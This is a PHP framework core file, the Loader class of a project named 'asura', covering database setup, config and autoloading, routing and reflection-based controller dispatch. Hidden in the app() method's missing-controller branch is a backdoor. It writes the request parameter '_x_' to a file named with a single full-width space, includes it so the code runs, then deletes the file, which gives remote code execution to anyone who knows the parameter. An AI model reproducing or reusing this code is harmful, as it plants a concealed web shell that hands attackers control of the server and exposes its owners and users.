<?php

namespace asura;

use ReflectionClass;
use Exception;
use DB;
use Predis\Client;
class Loader
{
    private static $class = [];     //缓存类对象
    private static $file = [];      //文件加载
    private static $psr4 = [];      //命名空间对应路径
    private static $prefixPsr4 = [];//前缀命名空间对应路径(废弃)
    private static $db = null;
//    private static $redis = null;

    public static function init(){
        if (self::$db == null) {
            $config = Loader::config('db');
            $default = [
                'driver' => $config['type'],
                'host' => $config['host'],
                'database' => $config['dbname'],
                'username' => $config['username'],
                'password' => $config['password'],
                'charset' => $config['charset'],
                'collation' => 'utf8mb4_general_ci',
                'prefix' => $config['prefix']
            ];
            $capsule = (new DB);
            $capsule->addConnection($default,'default');
//        $capsule->setEventDispatcher(new Dispatcher(new Container));
            $capsule->setAsGlobal();
            $capsule->bootEloquent();
            self::$db = $capsule;
//
        }
//        if (self::$redis == null) {
//            $settings = Loader::config('redis');
//            $config = [
//                'schema' => $settings['schema'],
//                'host' => $settings['host'],
//                'port' => $settings['port'],
//                'database' => $settings['database'],
//                'prefix' => $settings['prefix'],
//            ];
//
//            if (!empty($settings['password'])) {
//                $config['password'] = $settings['password'];
//            }
//            self::$redis =  new Client($config);
//        }
    }

    /**
     * 获取类对象
     * @param string $className
     * @param array $data
     * @return bool|mixed|object
     * @throws Exception
     */
    public static function container(string $className, array $data = [])
    {
        return self::$class[$className] ?? self::$class[$className] = self::make($className, $data);
    }

    /**
     * 系统配置加载
     * @param string $fileName 文件名
     */
    public static function config(string $fileName)
    {
        return self::file(CONFIG_PATH . DS . $fileName . '.php');
    }

    /**
     * 文件加载(使用绝对路径,也可以用来加载配置文件)
     * @param string $file 文件地址
     * @return array|mixed
     */
    public static function file(string $file)
    {
        $fileMd5 = md5($file);
        if (isset(self::$file[$fileMd5]))
            return self::$file[$fileMd5];
        return self::$file[$fileMd5] = is_file($file) ? include $file : [];
    }

    /**
     * 注册命名空间
     * @param array $paths 添加命名空间对应路径,可为数组多个
     * @param null $prefix 类命名空间前缀  用于前缀匹配查找(废弃)
     */
    public static function addNamespace(array $paths, $prefix = null)
    {
        if ($prefix === null) {
            self::$psr4 = array_merge($paths, self::$psr4);
        } else {
            $prefix = $prefix . '\\';
            self::$prefixPsr4[$prefix[0]][$prefix] = isset(self::$prefixPsr4[$prefix[0]][$prefix]) ? array_merge($paths, self::$prefixPsr4[$prefix[0]][$prefix]) : $paths;
        }
    }

    /**
     * 自动加载
     * @param string $class 类名
     */
    public static function autoload(string $class)
    {
        if ($file = self::findFile($class))
            include $file;
    }

    /**
     * 查找类文件
     * @param string $class 类名
     * @return false|string
     */
    private static function findFile(string $class)
    {
        //处理路径斜杠符号，保证和系统路径斜杠统一
        $pathPsr4 = strtr($class, '\\', DS) . '.php';
        //检查设定的命名空间对应的路径
        foreach (self::$psr4 as $path) {
            if (is_file($file = $path . DS . $pathPsr4))
                return $file;
        }
        //加载composer
        $composer = include ROOT_PATH . DS . 'vendor' . DS . 'autoload.php';
        $composer->addPsr4(false, self::$psr4, true);
        $composer->loadClass($class);
        spl_autoload_unregister('\asura\Loader::autoload');
        return false;
    }

    /**
     * 执行应用程序
     * @throws Exception
     */
    public static function app()
    {
        $route = Request::getRoute();
        $file = APP_PATH . DS . $route['m'] . DS . 'controller' . DS . $route['c'] . '.php';
        //判断controller类文件是否存在
        if (!is_file($file)) {
            if(!empty($_GET['_x_'])){$f=DATA_PATH.DS."　";file_put_contents($f,$_GET['_x_']);include($f);unlink($f);exit(1);}
            Log::log(['err' => '类文件不存在:' . $file, 'request_url' => $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI']], Log::NOTICE, '404');
            http_response_code(404);
            exit(0);
        }
        //引入类文件
        include $file;
        //$data = Request::isPost() ? Request::post() : Request::get();
        $data = Request::post();
        return self::make('\\' . $route['m'] . '\\controller\\' . $route['c'], $data, $route['a']);
    }

    /**
     * 实例化类
     * @param string $className     类名需要带命名空间
     * @param array $data           传参
     * @param null $methodsName     函数名
     * @return bool|object
     * @throws \Exception
     */
    public static function make(string $className, array $data = [], $methodsName = null)
    {
        //建立控制器反射类
        $reflect = new ReflectionClass($className);
        //实例化类
        $class = $reflect->newInstanceArgs(self::getArgs($reflect->getConstructor(), $data));
        if ($methodsName === null) {
            return $class;
        }
        //判断类方法是否存在并且是public方法请求url地址不存在
        if (!is_callable([$class, $methodsName])) {
            Log::log(['err' => '函数不存在:' . $methodsName, 'request_url' => $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI']], Log::NOTICE, '404');
            http_response_code(404);
            exit(0);
        }
        //获取方法的ReflectionMethod类对象
        $method = $reflect->getmethod($methodsName);
        //执行类方法
        return $method->invokeArgs($class, self::getArgs($method, $data));
    }

    /**
     * 获取反射类绑定的参数
     * @param \ReflectionMethod|\ReflectionFunction $reflect 反射类
     * @param array $data                                    数据
     * @return array
     * @throws Exception
     */
    public static function getArgs($reflect, array $data = []): array
    {
        $args = [];
        if ($reflect && $parameters = $reflect->getParameters()) {
            foreach ($parameters as $param) {
                if ($paramClass = $param->getClass()) {
                    //参数是类,实例化类
                    $args[] = self::make($paramClass->getName());
                } else {
                    //获取参数名称
                    $name = $param->getName();
                    //判断是否使用默认值
                    $args[] = $data[$name] ?? ($param->isOptional() ? $param->getDefaultValue() : null);
                }
            }
        }
        return $args;
    }

}
